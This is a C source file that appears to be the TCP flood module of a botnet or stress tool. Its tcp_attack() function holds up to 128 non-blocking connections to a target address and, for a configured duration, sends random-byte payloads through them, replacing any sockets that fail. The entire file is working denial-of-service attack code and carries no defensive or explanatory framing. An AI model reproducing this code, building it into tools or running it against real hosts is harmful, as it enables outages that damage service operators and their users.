#define _GNU_SOURCE
#include "headers/attack_params.h"

#define MAX_CONNECTIONS 128
#define BUFFER_SIZE 1024 * 1024//65535 // 1MB

static int connect_socket(struct sockaddr_in *addr) {
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        return -1;
    }

    int one = 1;
    if (setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one)) < 0) {
        close(sock);
        return -1;
    }

    int flags = fcntl(sock, F_GETFL, 0);
    if (flags == -1) {
        close(sock);
        return -1;
    }
    fcntl(sock, F_SETFL, flags | O_NONBLOCK);

    if (connect(sock, (struct sockaddr *)addr, sizeof(*addr)) == -1) {
        if (errno != EINPROGRESS) {
            close(sock);
            return -1;
        }
    }
    return sock;
}

void tcp_attack(attack_params *params) {
    int sockets[MAX_CONNECTIONS];
    memset(sockets, -1, sizeof(sockets));
    int active_sockets = 0;

    static char buffer[BUFFER_SIZE];
    int psize = params->psize > 0 ? params->psize : 32;
    if (psize > BUFFER_SIZE) psize = BUFFER_SIZE;
    
    int i;
    for (i = 0; i < BUFFER_SIZE; i++) {
        buffer[i] = (char)(rand() % 256);
    }

    time_t end_time = time(NULL) + params->duration;
    struct timeval last_cleanup = {0, 0};

    while (time(NULL) < end_time && params->active) {
        while (active_sockets < MAX_CONNECTIONS) {
            int sock = connect_socket(&params->target_addr);
            if (sock < 0) break;
            sockets[active_sockets++] = sock;
        }

        fd_set write_fds;
        FD_ZERO(&write_fds);
        int max_fd = -1;
        for (i = 0; i < MAX_CONNECTIONS; i++) {
            if (sockets[i] != -1) {
                FD_SET(sockets[i], &write_fds);
                if (sockets[i] > max_fd) {
                    max_fd = sockets[i];
                }
            }
        }

        if (max_fd == -1) {
            usleep(1000); 
            continue;
        }

        struct timeval tv = {0}; 
        tv.tv_usec = 10000;

        if (select(max_fd + 1, NULL, &write_fds, NULL, &tv) > 0) {
            for (i = 0; i < MAX_CONNECTIONS; i++) {
                if (sockets[i] != -1 && FD_ISSET(sockets[i], &write_fds)) {
                    int so_error;
                    socklen_t len = sizeof(so_error);
                    getsockopt(sockets[i], SOL_SOCKET, SO_ERROR, &so_error, &len);

                    if (so_error == 0) {
                        ssize_t sent = send(sockets[i], buffer, psize, MSG_NOSIGNAL | MSG_DONTWAIT);
                        if (sent <= 0 && errno != EAGAIN && errno != EWOULDBLOCK) {
                            close(sockets[i]);
                            sockets[i] = sockets[--active_sockets];
                            sockets[active_sockets] = -1;
                            i--;
                        }
                    } else if (so_error != EINPROGRESS && so_error != EAGAIN && so_error != EWOULDBLOCK) {
                        close(sockets[i]);
                        sockets[i] = sockets[--active_sockets];
                        sockets[active_sockets] = -1;
                        i--;
                    }
                }
            }
        }

        struct timeval now;
        gettimeofday(&now, NULL);
        if (now.tv_sec - last_cleanup.tv_sec >= 1) {
            for (i = 0; i < active_sockets; i++) {
                char test;
                if (recv(sockets[i], &test, 1, MSG_PEEK | MSG_DONTWAIT) == 0) {
                    close(sockets[i]);
                    sockets[i] = sockets[--active_sockets];
                    sockets[active_sockets] = -1;
                    i--;
                }
            }
            last_cleanup = now;
        }
    }

    for (i = 0; i < active_sockets; i++) {
        if (sockets[i] != -1) {
            close(sockets[i]);
        }
    }
}

